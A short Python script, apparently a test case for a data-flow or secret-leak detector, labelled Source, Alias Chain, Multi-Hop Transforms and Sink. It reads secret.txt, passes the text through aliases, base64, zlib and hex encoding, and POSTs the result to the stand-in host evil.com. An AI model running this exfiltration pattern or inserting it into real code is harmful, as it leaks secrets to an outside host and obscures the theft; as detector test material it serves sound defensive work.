import base64
import zlib
import binascii
import requests

# -----------------------
# Source
# -----------------------

with open("secret.txt") as f:

    original_data = f.read()

# -----------------------
# Alias Chain
# -----------------------

a = original_data
b = a
c = b

# -----------------------
# Multi-Hop Transforms
# -----------------------

encoded = base64.b64encode(c)

compressed = zlib.compress(
    encoded
)

payload = binascii.hexlify(
    compressed
)

# -----------------------
# Sink
# -----------------------

requests.post(
    "http://evil.com",
    data=payload
)